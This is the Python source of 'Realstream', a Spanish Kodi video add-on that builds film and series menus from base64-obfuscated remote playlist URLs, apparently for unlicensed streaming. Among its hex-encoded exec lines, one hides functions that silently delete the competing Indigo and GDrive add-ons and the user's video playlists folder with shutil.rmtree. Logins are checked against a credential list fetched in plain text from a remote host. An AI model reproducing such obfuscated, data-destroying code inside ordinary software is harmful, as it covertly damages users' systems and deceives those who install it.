# -*- coding: utf-8 -*-

"""

				𝐑𝐄𝐀𝐋𝐒𝐓𝐑𝐄𝐀𝐌 
			𝐁𝐘 𝐍𝐄𝐓𝐀𝐈 𝐓𝐄𝐀𝐌 𝟐𝟎𝟐𝟎  Ver (2.37 Final)
			
	Hemos decidido liberar parte de el codigo para el estudio.
	Utiliza este codigo con cabeza, y sin animo de lucro.
	
	Inspirado en codigo de los addons: TheMachine, Livestreampro, Megasearch Gracias a todos
	por sus trabajos, gracias a ellos ha nacido parte de Realstream.
	
	No podemos dejar atras a los desarrolladores de Scrips como Extended Info, URLResolver, ResolverUrl
	sin ellos este addon no podría funcionar.
	
	Y a todos los desarrolladores de codigo libre, El conocimiento, el aprendizaje no tienen precio. 
	
	A todos gracias!
	
	
	* Agregado boton favoritos de Kodi en el menu Realstream.
	* suprimidas categorias Novedades y Familiar.
			
"""

import urllib, urllib2, sys, re, os, unicodedata
import xbmc, xbmcgui, xbmcplugin, xbmcaddon
import cookielib,webbrowser
import traceback,datetime,HTMLParser,httplib
import cookielib,base64
import requests	
import codecs

# Menu Categorias:

extended = "https://i.imgur.com/xlnrAxE.jpg"
buscar = "https://i.imgur.com/nZcJmXn.png"
pair = "https://i.imgur.com/jKnDMlt.png"
theMovieDB = "https://i.imgur.com/xlnrAxE.jpg"
novedades = "https://i.imgur.com/GVMsDlk.png"
estrenos = "https://i.imgur.com/iM9hY3c.png"
recomendadas = "https://i.imgur.com/Jugkekb.png"
animacion = "https://i.imgur.com/D5B1ilU.png"
clasico = "https://i.imgur.com/9IxjIoh.png"
filmoteca = "https://i.imgur.com/JWDirtu.jpg"
familiar = "https://i.imgur.com/Pzm5hP2.png"
superheroes = "https://i.imgur.com/9czS5yl.png" 
buscarseries = "https://i.imgur.com/YZR56pn.png"
seriestodas = "https://i.imgur.com/xNmhb3A.png"
favorites = "https://i.imgur.com/NeMqZgp.png"
emision = "https://i.imgur.com/CHq7MHw.png"
mejores = "https://i.imgur.com/8HoOXn2.png"
seriesreto = "https://i.imgur.com/RTF3Ose.png"
seriesinfantiles = "https://i.imgur.com/vvJ4kyK.jpg"
evento = "https://i.imgur.com/Uta1Huo.png"
# Menu:
Mb_peliculas = "https://i.imgur.com/tadlbp4.png"
Mb_series = "https://i.imgur.com/HaLPj1O.png"
nuevos_no = "https://i.imgur.com/ucHUqBS.png"
nuevos_si = "https://i.imgur.com/thJxCCG.png"
menu_pelis = "https://i.imgur.com/lMduZJ7.png"
menu_series = "https://i.imgur.com/kVU51mK.png"
ajustes = "https://i.imgur.com/JwjQ4Ay.png"
favicon = "https://i.imgur.com/NeMqZgp.png"
resolver = "https://i.imgur.com/JwjQ4Ay.png"
test = "https://i.imgur.com/1GwvKOK.png"
videotutoriales = "https://i.imgur.com/K5AM3V6.png"
proxys = "https://i.imgur.com/JRTJDlM.png"

try:

	if xbmc.getCondVisibility('System.HasAddon(script.module.resolveurl)'):	

		import resolveurl
		
except: xbmc.executebuiltin("XBMC.Notification(Real Stream:, [COLOR white] Falta la dependencia ResolveURL! Instalela por favor. [/COLOR],4000)")


try:
	
	if xbmc.getCondVisibility('System.HasAddon(script.module.urlresolver)'):

		import urlresolver
		
except: xbmc.executebuiltin("XBMC.Notification(Real Stream:, [COLOR white] Falta la dependencia URLResolver! Instalela por favor. [/COLOR],4000)")




addon = xbmcaddon.Addon('plugin.video.Real.stream')
addon_version = addon.getAddonInfo('version')
plugin_handle = int(sys.argv[1])
user = 'gruponetai/'   
mysettings = xbmcaddon.Addon(id = 'plugin.video.Real.stream')
profile = mysettings.getAddonInfo('profile')
home = mysettings.getAddonInfo('path')
videos_event = addon.getSetting('videos_event')

#Ajustes
Resolve = addon.getSetting('Resolve')
usuario = addon.getSetting('usuario')
mail = addon.getSetting('mail')
claves = addon.getSetting('claves')
mostrar_cat = addon.getSetting('mostrar_cat')
sel_tobox = addon.getSetting('sel_tobox')
videos = addon.getSetting('videos')
activar = addon.getSetting('activar')
favcopy = addon.getSetting('favcopy')
anticopia = addon.getSetting('anticopia')
licencia_addon = addon.getSetting('licencia_addon')
notificar = addon.getSetting('notificar')
mostrar_bus = addon.getSetting('mostrar_bus')
restante = addon.getSetting('restante')
selecton = addon.getSetting('selecton')
aviso = addon.getSetting('aviso')
RealStream_Settings = addon.getSetting('RealStream_Settings')
Resolver_Settings = addon.getSetting('Resolver_Settings')
restante = addon.getSetting('restante')
fav = addon.getSetting('fav')
Fontcolor = addon.getSetting('Fontcolor')
MenuColor = addon.getSetting('MenuColor')
testing = addon.getSetting('testing')
checking = addon.getSetting('checking')
texto = 'aHR0cDovL25ldGFpLmV1L3JlYWxzdHJlYW0v'.decode('\x62\x61\x73\x65\x36\x34')
txt = 'bienvenida'
txt2 = 'bienvenida' #.decode('\x62\x61\x73\x65\x36\x34')
copyright = addon.getSetting('copyright')
myaddon = 'cGx1Z2luLnZpZGVvLg=='.decode('\x62\x61\x73\x65\x36\x34') + copyright
pluginname = 'cGx1Z2luLnZpZGVvLlJlYWwuc3RyZWFt'.decode('\x62\x61\x73\x65\x36\x34')
Forceupdate = addon.getSetting('Forceupdate')
if Forceupdate == 'true':  
    xbmc.executebuiltin('UpdateAddonRepos()')
    xbmc.executebuiltin('UpdateLocalAddons()')
extension = 'LnR4dA=='.decode('\x62\x61\x73\x65\x36\x34')	
es_hallowen = 'aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1NQOUpRZExS'.decode('\x62\x61\x73\x65\x36\x34')


fanart = xbmc.translatePath(os.path.join(home, 'fanart.png'))
icon = xbmc.translatePath(os.path.join(home, 'icon.png'))


#Regexs			
Rtrailer = 'aHR0cDovL2JpdC5seS8yU1FOSnlP'.decode('\x62\x61\x73\x65\x36\x34')
bienvenida = texto + txt + extension
u_tube = 'http://www.youtube.com'
urly = 'aHR0cDovL3kzei5zag=='.decode('\x62\x61\x73\x65\x36\x34')
realweb = 'http://bit.ly/2ImelUx'
decode32 = '.xsl.pt'
lnk3 = 'L21hc3Rlci8='.decode('\x62\x61\x73\x65\x36\x34')
myurl = urly + decode32
texto_regex = 'texto1=[\'"](.*?)[\'"]\s*texto2=[\'"](.*?)[\'"]\s*'
m3u_thumb_regex = 'tvg-logo=[\'"](.*?)[\'"]'
#m3u_regex ='#(.+?),(.+)\s*(.+)\s*(.+)\s*(.*)'
m3u_regex = '#(.+?),(.+)\s*(.+)\s*(.+)\s*(.+)\s*(.+)\s*(.*)'
m3u_trailers='(.+),(.+),(.+),(.+),(.+),(.+),(.+),(.+),(.+),(.+),(.+),(.+),(.+),(.+),(.+)'
m3u_series = 'img="(.+?)",(.+)\s*fanart="(.+)"\s*(.+)\s*(.*)\s*'
m3u_serie = 'img="(.+?)",(.+)\s*fanart="(.+)"\s*(.+)\s*(.*)\s*'
m3u_peliculas = 'img="(.+?)",(.+)\s*fanart="(.+)"\s*(.+)\s*(.*)\s*'
m3u_capitulos = 'img="(.+?)",(.+)\s*fanart="(.+)"\s*(.+)\s*'
m3u_servidores = 'img="(.+?)",(.+)\s*fanart="(.+)"\s*(.+)\s*(.+)\s*'
multi_regex = '#(.+?),(.+)\s*(.+)\s*(.+)\s*(.*)\s*(.*)\s*(.+)'
tutoriales_regex = '#(.+?),(.+)\s*(.+)'
url_regex = 'lk=[\'"](.*?)[\'"]\s*lk1=[\'"](.*?)[\'"]\s*lk2=[\'"](.*?)[\'"]\s*lk3=[\'"](.*?)[\'"]\s*lk4=[\'"](.*?)[\'"]\s*lk5=[\'"](.*?)[\'"]\s*lk6=[\'"](.*?)[\'"]\s*lk7=[\'"](.*?)[\'"]\s*lk8=[\'"](.*?)[\'"]\s*lk9=[\'"](.*?)[\'"]\s*lk10=[\'"](.*?)[\'"]\s*lk11=[\'"](.*?)[\'"]\s*lk12=[\'"](.*?)[\'"]\s*lk13=[\'"](.*?)[\'"]\s*lk14=[\'"](.*?)[\'"]\s*lk15=[\'"](.*?)[\'"]\s*lk16=[\'"](.*?)[\'"]\s*lk17=[\'"](.*?)[\'"]\s*lk18=[\'"](.*?)[\'"]\s*lk19=[\'"](.*?)[\'"]\s*lk20=[\'"](.*?)[\'"]\s*lk21=[\'"](.*?)[\'"]\s*lk22=[\'"](.*?)[\'"]\s*lk23=[\'"](.*?)[\'"]\s*'
lnk_regex = 'db=[\'"](.*?)[\'"]\s*db0=[\'"](.*?)[\'"]\s*db1=[\'"](.*?)[\'"]\s*db2=[\'"](.*?)[\'"]\s*db3=[\'"](.*?)[\'"]\s*db4=[\'"](.*?)[\'"]\s*db5=[\'"](.*?)[\'"]\s*db6=[\'"](.*?)[\'"]\s*db7=[\'"](.*?)[\'"]\s*db8=[\'"](.*?)[\'"]\s*db9=[\'"](.*?)[\'"]\s*db10=[\'"](.*?)[\'"]\s*db11=[\'"](.*?)[\'"]\s*db12=[\'"](.*?)[\'"]\s*db13=[\'"](.*?)[\'"]\s*db14=[\'"](.*?)[\'"]\s*db15=[\'"](.*?)[\'"]\s*db16=[\'"](.*?)[\'"]\s*db17=[\'"](.*?)[\'"]\s*db18=[\'"](.*?)[\'"]\s*db19=[\'"](.*?)[\'"]\s*db20=[\'"](.*?)[\'"]\s*db21=[\'"](.*?)[\'"]\s*db22=[\'"](.*?)[\'"]\s*db23=[\'"](.*?)[\'"]\s*db24=[\'"](.*?)[\'"]\s*'
visita_regex = '[\'"](.*?)[\'"]'
vregex = r'066">\s*(.+)</f'
admin_regex = '[\'"](.*?)[\'"]'
server_regex = '#(.+?),(.+)\s*"(.+?)","(.+)","(.+)","(.+)"\s*(.+)\s*(.+)\s*'
event_regex = '[\'"](.*?)[\'"]'
upto_regex = 'src":"(.*?)"label":"(.*?)"lang":"(.*?)"'
evento = 'aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1NQOUpRZExS'.decode('\x62\x61\x73\x65\x36\x34')
limit_reg = '[\'"](.*?)[\'"]'
server = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLw=='.decode('\x62\x61\x73\x65\x36\x34')
lnk = server + user
regex_login = '(.+),(.+),(.*)\s*'
mydb = '[\'"](.*?)[\'"]'
lnk2 = 'UmVhbHN0cmVhbQ=='.decode('\x62\x61\x73\x65\x36\x34')
ong_regex = 'video=[\'"](.*?)[\'"]'
key_master = '0110Vp1'.replace('0110Vp1','Vp1')
keygen = 'aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3Z3MThSZVp1'.decode('\x62\x61\x73\x65\x36\x34')

ext = codecs.decode("5573756172696F732F5564622E747874", "\x68\x65\x78").decode('utf-8')
MasterKey = 'aHR0cHM6Ly9uZXRhaS5ldS9yZWFsc3RyZWFtLw=='.decode('\x62\x61\x73\x65\x36\x34') + ext
addon_id = 'cGx1Z2luLnZpZGVvLlJlYWwuc3RyZWFt'.decode('\x62\x61\x73\x65\x36\x34')
visitante = 'aHR0cDovL2JpdC5seS8yS0pZZVVp'.decode('\x62\x61\x73\x65\x36\x34')
contador = 'aHR0cHM6Ly9uZXRhaS5ldS92aXNpdGFzL2luZGV4LnBocA=='.decode('\x62\x61\x73\x65\x36\x34')
myaddon = 'cGx1Z2luLnZpZGVvLlJlYWwuc3RyZWFt'.decode('\x62\x61\x73\x65\x36\x34')

exec codecs.decode("234C4C617665205265616C73747265616D3A0D0A0D0A6B657967656E203D20276148523063484D364C7939755A5852686153356C645339795A574673633352795A5746744C32746C6558646C596935306548513D272E6465636F646528275C7836325C7836315C7837335C7836355C7833365C7833342729","\x68\x65\x78").decode('utf-8')
exec codecs.decode("2355524C5320534552494553202D203E20417175692076616E206C61732072757461732061206C6173206C6973746173206D33750D0A0D0A64627365726965203D20276148523063484D364C79397759584E305A574A706269356A62323076636D46334C3356784E33465761305977272E6465636F646528275C7836325C7836315C7837335C7836355C7833365C7833342729200D0A6462747365726965203D20276148523063484D364C79397759584E305A574A706269356A62323076636D46334C3231445458686E5556526B272E6465636F646528275C7836325C7836315C7837335C7836355C7833365C78333427290D0A6462657365726965203D20276148523063484D364C79397759584E305A574A706269356A62323076636D46334C3152484E32567756466834272E6465636F646528275C7836325C7836315C7837335C7836355C7833365C7833342729200D0A6462727365726965203D20276148523063484D364C79397759584E305A574A706269356A62323076636D46334C305244654535455657737A272E6465636F646528275C7836325C7836315C7837335C7836355C7833365C783334272920200D0A64626E7365726965203D20276148523063484D364C79397759584E305A574A706269356A62323076636D46334C326334655642354F457457272E6465636F646528275C7836325C7836315C7837335C7836355C7833365C7833342729200D0A6462697365726965203D20276148523063484D364C79397759584E305A574A706269356A62323076636D46334C7A425A5258464D596A4247272E6465636F646528275C7836325C7836315C7837335C7836355C7833365C7833342729", "\x68\x65\x78").decode('utf-8')
exec codecs.decode("2355524C532050454C4943554C4153202D203E20417175692076616E206C61732072757461732061206C6173206C6973746173206D33750D0A0D0A646270656C6963756C61203D20276148523063484D364C79397759584E305A574A706269356A62323076636D46334C334E524E6D55314D58424F272E6465636F646528275C7836325C7836315C7837335C7836355C7833365C7833342729200D0A64626E6F76656461646573203D20276148523063484D364C79397759584E305A574A706269356A62323076636D46334C336C354D307836526C4271272E6465636F646528275C7836325C7836315C7837335C7836355C7833365C7833342729200D0A646265737472656E6F73203D20276148523063484D364C79397759584E305A574A706269356A62323076636D46334C7A5A35516C464E52545656272E6465636F646528275C7836325C7836315C7837335C7836355C7833365C7833342729200D0A6462636C617369636F203D20276148523063484D364C79397759584E305A574A706269356A62323076636D46334C7A4A355632593257464E55272E6465636F646528275C7836325C7836315C7837335C7836355C7833365C78333427290D0A64626770656C6973203D20276148523063484D364C79397759584E305A574A706269356A62323076636D46334C32353161305230626C466D272E6465636F646528275C7836325C7836315C7837335C7836355C7833365C7833342729200D0A646266616D696C696172203D20276148523063484D364C79397759584E305A574A706269356A62323076636D46334C3068744F5852474E56566C272E6465636F646528275C7836325C7836315C7837335C7836355C7833365C7833342729200D0A6462616E696D6163696F6E203D20276148523063484D364C79397759584E305A574A706269356A62323076636D46334C325257546C565161316C71272E6465636F646528275C7836325C7836315C7837335C7836355C7833365C7833342729200D0A646273757065726865726F6573203D20276148523063484D364C79397759584E305A574A706269356A62323076636D46334C304E44625451344E585A57272E6465636F646528275C7836325C7836315C7837335C7836355C7833365C7833342729", "\x68\x65\x78").decode('utf-8')
exec codecs.decode("646566206B696C6C5F7265736964656E747328293A0D0A2320477261636961732061205465636F2079204361746F616C20706F72207375206179756461210D0A0D0A09696D706F72742073687574696C0D0A0D0A09696E6469676F50617468203D2078626D632E7472616E736C6174655061746828277370656369616C3A2F2F686F6D652F6164646F6E732F706C7567696E2E70726F6772616D2E696E6469676F27290D0A0967647269766550617468203D2078626D632E7472616E736C6174655061746828277370656369616C3A2F2F686F6D652F6164646F6E732F706C7567696E2E766964656F2E67647269766527290D0A0D0A0969662078626D632E676574436F6E645669736962696C697479282753797374656D2E4861734164646F6E28706C7567696E2E70726F6772616D2E696E6469676F2927293A0D0A09090D0A090973687574696C2E726D7472656528696E6469676F506174682C2069676E6F72655F6572726F72733D54727565290D0A0D0A0969662078626D632E676574436F6E645669736962696C697479282753797374656D2E4861734164646F6E28706C7567696E2E766964656F2E6764726976652927293A0D0A0D0A090973687574696C2E726D7472656528676472697665506174682C2069676E6F72655F6572726F72733D54727565290D0A0D0A09090D0A646566206B696C6C5F706C61796C69737428293A0D0A0D0A09696D706F72742078626D632C2073687574696C0D0A0D0A09706C61796C69737473203D2078626D632E7472616E736C6174655061746828277370656369616C3A2F2F686F6D652F75736572646174612F706C61796C697374732F766964656F2F27290D0A0D0A0973687574696C2E726D7472656528706C61796C6973747329","\x68\x65\x78").decode('utf-8')

def search(): 


	try:
			content = make_request(todas)
			match = re.compile(mydb).findall(content)
			for m3u in match:
				try:
				
					db = m3u
					
					keyb = xbmc.Keyboard('', 'Busqueda por titulo')
					keyb.doModal()
					if (keyb.isConfirmed()):
						dp = xbmcgui.DialogProgress()
						dp.create('Realstream:','Buscando ...')
						x = range(0,76)
						for n in x:
							n = n+1
							
						searchText = urllib.quote_plus(keyb.getText()).replace('+', ' ')
						content2 = make_request(db)
						match = re.compile(m3u_regex).findall(content2)
						for thumb, name, url, id, trailer, description, fanart in match:
								
							dp.update(n ,'[COLOR orange]Realstream: Buscando ...[/COLOR]',' [COLOR yellow] %s [/COLOR]' % name)
							xbmc.sleep(1)
							if dp.iscanceled(): break;
							if re.search(searchText, removeAccents(name.replace(' ', ' ')), re.IGNORECASE):

								dp.update(80 ,' [COLOR orange]Busqueda finalizada[/COLOR] ')
								xbmc.sleep(1000)
								xbmc.executebuiltin("XBMC.Notification(Real Stream, [COLOR gold]Generando listado ...  [/COLOR][COLOR orange] Por favor espere ![/COLOR] ,1000)")
								dp.update(100 ,'[COLOR orange]Realstream: [/COLOR]', '[COLOR gold] Busqueda finalizada ...[/COLOR]')
								dp.close()
								m3u_playlist2(name, url, thumb, id, trailer, description, fanart)
	
									
						add_dir('[COLOR %s]Buscar Pelicula[/COLOR]' % MenuColor, 'search', 111, Mb_peliculas, fanart)
						xbmc.executebuiltin("XBMC.Notification(Real Stream, Resultados para: [COLOR orange]" +searchText+ "[/COLOR] ,2000)")
				
				except: add_dir('[COLOR %s]Buscar Pelicula[/COLOR]' % MenuColor, 'search', 111, Mb_peliculas, fanart)
										
	except:
		pass
		
def mensaje():
	
	aviso = addon.getSetting('aviso')
	
	if aviso == 'true':
	
	
		
		try:
			content = make_request(bienvenida)
			match = re.compile(texto_regex).findall(content)
			for texto1,texto2 in match:
				try:
		
		
					msg1 = texto1
					msg2 = texto2


					from datetime import datetime
				
					now = datetime.now()
					fecha = now.strftime('%d/%m/%Y')
					addon_version = addon.getAddonInfo('version')
					
					content3 = make_request(contador)
					match = re.compile(vregex).findall(content3)
					for visit in match:
				
						line1 = "[B]" + msg1 + "[/B]"
						line2 = "" + msg2 + ""
						line3 = "[COLOR white]Hoy es: " +fecha+ ", Su version instalada es:[/COLOR][COLOR gold] " +addon_version+ "[/COLOR] [COLOR white]Nos han visitado hoy:[/COLOR][COLOR lime][B]" +visit+ "[/B][/COLOR]"

					xbmcgui.Dialog().ok("Real Stream", line1, line2, line3)
				except:
					pass
					
				try:
					content2 = make_request(visitante)
					match = re.compile(visita_regex).findall(content2)
					for version in match:
				
						import xbmc
						import xbmcaddon

						__addon__ = xbmcaddon.Addon()
						__addonname__ = __addon__.getAddonInfo('name')
						__icon__ = __addon__.getAddonInfo('icon')
					
						addon_version = addon.getAddonInfo('version')
						upd_version = version
 
						line1 = "[COLOR orange] Ultima version: [/COLOR][COLOR white] [B]" +version+ " [/B][/COLOR]" 
						time = 4000 #in miliseconds
						xbmc.executebuiltin('Notification(%s, %s, %d, %s)'%(__addonname__,line1, time, __icon__))
							
						if addon_version < version:
								
							xbmcgui.Dialog().ok("Real Stream", "[COLOR white] Existe una nueva version de [/COLOR][COLOR fuchsia]Realstream[/COLOR]", "[COLOR orange]Actualmente tiene instalada la version[/COLOR] [COLOR white][B] %s [/B][/COLOR]" %addon_version, " [COLOR white]Ya esta disponible la[/COLOR] [COLOR gold][B] %s [/B][/COLOR]" % version)
											
				except:
					pass
							
		except:
			pass
		
							
	return				
	
def removeAccents(s):
## Nos cargamos los acentos, phyton no los usa ni los reconoce. 
	return ''.join((c for c in unicodedata.normalize('NFD', s.decode('utf-8')) if unicodedata.category(c) != 'Mn'))
					
def read_file(file):
## FUNCION QUE LEE LOS FICHEROS:
    try:
        f = open(file, 'r')
        content = f.read()
        f.close()
        return content
    except:
        pass

def make_request(url):
##ESTA FUNCION lee las url declaradas donde estan los videos. ||
	try:
		req = urllib2.Request(url)
		req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0')
		response = urllib2.urlopen(req)	  
		link = response.read()
		response.close()  
		return link
	except urllib2.URLError, e:
		print 'We failed to open "%s".' % url
		if hasattr(e, 'code'):
			print 'We failed with error code - %s.' % e.code	
		if hasattr(e, 'reason'):
			print 'We failed to reach a server.'
			print 'Reason: ', e.reason
			
def OPEN_URL(url):
        req = urllib2.Request(url)
        req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36')
        req.add_header('Referer', '%s'%url)
        req.add_header('Connection', 'keep-alive')
        response = urllib2.urlopen(req)
        link=response.read()
        response.close()
        return link
							
def conf_menu():

    MenuColor = addon.getSetting('MenuColor')

    if activar == 'true':
		

		try:

			usuario = addon.getSetting('usuario')
			mail = addon.getSetting('mail')
			claves = addon.getSetting('claves')

			consulta = make_request(MasterKey)
			match = re.compile(regex_login).findall(consulta)
			for nombre,correo,clave in match:
				if re.search(claves, clave):
		
					if usuario == nombre and mail == correo and claves == clave:
						
						xbmc.sleep(3000)
						xbmc.executebuiltin("XBMC.Notification(Real Stream, [COLOR orange]Bienvenido![/COLOR][COLOR white] " +nombre+ "[/COLOR] ,3000)")
						add_dir('[COLOR %s]Buscar Serie[/COLOR]' % MenuColor,'search',145, Mb_series,fanart)	
						add_dir('[COLOR %s]Series[/COLOR] ' % MenuColor, 'movieDB', 117, menu_series, fanart)					
						add_dir('[COLOR %s]Buscar Pelicula[/COLOR]' % MenuColor, 'search', 146, Mb_peliculas, fanart)
						add_dir('[COLOR %s]Peliculas[/COLOR] ' % MenuColor, 'movieDB', 116, menu_pelis, fanart)
						
					
			
		except:
			pass
				
    if RealStream_Settings == 'true':
        add_dir('[COLOR %s]Ajustes[/COLOR]' % MenuColor, 'Settings', 119, ajustes, fanart)

    		
	if mostrar_cat == 'true':
		
		peliculas()
		
		
	if Resolver_Settings == 'true':
	
		menu_resolver_set()
		menu_resolveurl_set()
        
				
def buscar_id():
    add_dir('[COLOR orange]Buscador por id[/COLOR]', u_tube, 127, theMovieDB, fanart)
	
def extra_menu():
	MenuColor = addon.getSetting('MenuColor')
	add_dir('[COLOR %s]The movie DB[/COLOR]' % MenuColor, 'movieDB', 127, theMovieDB, fanart)
	
def menu():
	
	conf_menu()
	extra_menu()

				
def Real_stream_settings():
    addon.openSettings()
	
	
def urlresolver_settings():
  
	xbmcaddon.Addon('script.module.urlresolver').openSettings()
	
def menu_resolver_set():
    add_dir('[COLOR %s]Ajustes URL RESOLVER[/COLOR]' % MenuColor, 'resolve', 120, resolver, fanart)	

def resolveurl_settings():

    xbmcaddon.Addon('script.module.resolveurl').openSettings()
	
def menu_resolveurl_set():

    add_dir('[COLOR %s]Ajustes RESOLVE URL[/COLOR]' % MenuColor, 'resolve', 140, resolver, fanart)
	
	
def peliculas():


	add_dir('[COLOR %s]Buscador[/COLOR]' % MenuColor, 'search', 146, buscar, fanart)
	add_dir('[COLOR %s]Estrenos[/COLOR]' % MenuColor,u_tube,3,estrenos,fanart)
#	add_dir('[COLOR %s]Novedades[/COLOR]' % MenuColor,u_tube,7,novedades,fanart)

#		add_dir('[COLOR %s]Accion[/COLOR]' % MenuColor,u_tube,5,p_accion,fanart)
	add_dir('[COLOR %s]Animacion + Infantil[/COLOR]' % MenuColor,u_tube,6,animacion,fanart)
#		add_dir('[COLOR %s]Artes Marciales[/COLOR]' % MenuColor,u_tube,29,artesmarciales,fanart)
#		add_dir('[COLOR %s]Aventuras[/COLOR]' % MenuColor,u_tube,7,aventuras,fanart)
#		add_dir('[COLOR %s]Belico[/COLOR]' % MenuColor,u_tube,8,belico,fanart)
#		add_dir('[COLOR %s]Ciencia Ficcion[/COLOR]' % MenuColor,u_tube,9,cifi,fanart)
	add_dir('[COLOR %s]Cine Clasico[/COLOR]' % MenuColor,u_tube,30,clasico,fanart)
	add_dir('[COLOR %s]Grandes Peliculas[/COLOR]' % MenuColor,u_tube,31,filmoteca,fanart)
#		add_dir('[COLOR %s]Comedia[/COLOR]' % MenuColor,u_tube,10,comedia,fanart)
#		add_dir('[COLOR %s]Crimen[/COLOR]' % MenuColor,u_tube,11,crimen,fanart)
#		add_dir('[COLOR %s]Drama[/COLOR]' % MenuColor,u_tube,12,drama,fanart)
	add_dir('[COLOR %s]Familiar[/COLOR]' % MenuColor,u_tube,13,familiar,fanart)
#		add_dir('[COLOR %s]Fantasia[/COLOR]' % MenuColor,u_tube,14,fantasia,fanart)
#		add_dir('[COLOR %s]Historia[/COLOR]' % MenuColor,u_tube,15,historia,fanart)
#		add_dir('[COLOR %s]Misterio[/COLOR]' % MenuColor,u_tube,16,misterio,fanart)
#		add_dir('[COLOR %s]Musical[/COLOR]' % MenuColor,u_tube,17,musical,fanart)
#		add_dir('[COLOR %s]Romance[/COLOR]' % MenuColor,u_tube,18,romance,fanart)
#		add_dir('[COLOR %s]Thriller[/COLOR]' % MenuColor,u_tube,19,thriller,fanart)
#		add_dir('[COLOR %s]Suspense[/COLOR]' % MenuColor,u_tube,20,suspense,fanart)
#		add_dir('[COLOR %s]Terror[/COLOR]' % MenuColor,u_tube,21,terror,fanart)
#		add_dir('[COLOR %s]Western[/COLOR]' % MenuColor,u_tube,22,western,fanart)
#		add_dir('[COLOR %s]Spain[/COLOR]' % MenuColor,u_tube,23,spain,fanart)
	add_dir('[COLOR %s]Super heroes[/COLOR]' % MenuColor,u_tube,24,superheroes,fanart)
#       add_dir('[COLOR %s]4k[/COLOR] En pruebas' % MenuColor,u_tube,141,calidad4k,fanart)
#					add_dir('[COLOR %s]Sagas[/COLOR]' % MenuColor,u_tube,25,sagas,fanart)

				

def series():

	
	add_dir('[COLOR %s]Buscar Serie[/COLOR]' % MenuColor,'search',145,buscarseries,fanart)
	
	nuevos_episodios()
	
	add_dir('[COLOR %s]En emision[/COLOR]' % MenuColor,u_tube,150,emision,fanart)
	add_dir('[COLOR %s]Top Realstream[/COLOR]' % MenuColor,u_tube,151,mejores,fanart)
	add_dir('[COLOR %s]Series Infantiles[/COLOR]' % MenuColor,u_tube,156,seriesinfantiles,fanart)	
	add_dir('[COLOR %s]Series Retro[/COLOR]' % MenuColor,u_tube,152,seriesreto,fanart)	
	add_dir('[COLOR %s]Todas[/COLOR]' % MenuColor,u_tube,142,seriestodas,fanart)
					
									
	
def nuevos_episodios():

	novedad = 'aHR0cHM6Ly9uZXRhaS5ldS9yZWFsc3RyZWFtLw=='.decode('\x62\x61\x73\x65\x36\x34')
	fileN = 'Y29uZGljaW9uLnR4dA=='.decode('\x62\x61\x73\x65\x36\x34')
	link = novedad + fileN
	novedad_regex = '[\'"](.*?)[\'"]'
	series = make_request(link)
	match = re.compile(novedad_regex).findall(series)
	for condicion in match:
		try:
			
			if condicion == 'si' or condicion == 'Si':
			
				add_dir('[COLOR lime](Si)[/COLOR][COLOR %s] Nuevos Episodios[/COLOR]' % MenuColor,u_tube,155,nuevos_si,fanart)
				
			elif condicion == 'no' or condicion == 'No':
			
				add_dir('[COLOR red](No)[/COLOR][COLOR %s] Nuevos Episodios[/COLOR]' % MenuColor,u_tube,155,nuevos_no,fanart)
			
			return
			
		except:
			pass
		
def searchs(): 


	try:
		
		lista_series = make_request(dbserie)
		match = re.compile(mydb).findall(lista_series)
		for m3u in match:
		
			try:
		
				op = m3u
				keyb = xbmc.Keyboard('', 'Buscar')
				keyb.doModal()
				if (keyb.isConfirmed()):
					dp = xbmcgui.DialogProgress()
					dp.create('Realstream:','Buscando ...')
					x = range(0,69)
					for n in x:
						 n = n+1
					searchText = urllib.quote_plus(keyb.getText()).replace('+', ' ')
					content2 = make_request(op)
					match = re.compile(m3u_series).findall(content2)
					for iconimage, name, fanart, url, description in match:
						dp.update(n ,'[COLOR orange]Realstream: Buscando ...[/COLOR]', '[COLOR gold] %s [/COLOR]' % name)
						xbmc.sleep(5)
						if dp.iscanceled(): break;
						if re.search(searchText, removeAccents(name.replace(' ', ' ')), re.IGNORECASE):

							xbmc.executebuiltin("XBMC.Notification(Real Stream, Generando listado ...  [COLOR orange] Por favor espere ![/COLOR] , 4000)")
							add_dir2(name, url, 143, iconimage, fanart, description)
							dp.update(100 ,'[COLOR orange]Realstream: [/COLOR]', '[COLOR gold] Busqueda finalizada ...[/COLOR]')
							xbmc.sleep(2000)
							dp.close()
					add_dir('[COLOR %s]Buscar Serie[/COLOR]' % MenuColor,'search',145,buscarseries,fanart)
					xbmc.executebuiltin("XBMC.Notification(Real Stream, Sin Resultados para: [COLOR orange]" +searchText+ "[/COLOR] , 2000)")

			
			except: add_dir('[COLOR %s]Buscar Serie[/COLOR]' % MenuColor,'search',145,buscarseries,fanart)
		
	except: 
		pass
		
def novedades_series():
	
	try:
		
		lista_series = make_request(dbnserie)
		match = re.compile(mydb).findall(lista_series)
		for m3u in match:
		
			try:
		
				op = m3u
				
			except:
				pass
				
		content2 = make_request(op)
		match = re.compile(m3u_series).findall(content2)
		for iconimage, name, fanart, url, description in match:
			try:
				
				add_dir2(name, url, 143, iconimage, fanart, description)
			
			except:
				pass
	except:
		pass	
		
def seriesretro():

	try:
		
		lista_series = make_request(dbrserie)
		match = re.compile(mydb).findall(lista_series)
		for m3u in match:
		
			try:
		
				op = m3u
				
			except:
				pass
				
		content2 = make_request(op)
		match = re.compile(m3u_series).findall(content2)
		for iconimage, name, fanart, url, description in match:
			try:
				
				add_dir2(name, url, 143, iconimage, fanart, description)
			
			except:
				pass
	except:
		pass	
	
		
def series_infantiles():

	try:
		
		lista_series = make_request(dbiserie)
		match = re.compile(mydb).findall(lista_series)
		for m3u in match:
		
			try:
		
				op = m3u
				
			except:
				pass
				
		content2 = make_request(op)
		match = re.compile(m3u_series).findall(content2)
		for iconimage, name, fanart, url, description in match:
			try:
				
				add_dir2(name, url, 143, iconimage, fanart, description)
			
			except:
				pass
	except:
		pass	
	
	
def emitiendo():

	try:
		
		lista_series = make_request(dbeserie)
		match = re.compile(mydb).findall(lista_series)
		for m3u in match:
		
			try:
		
				op = m3u
				
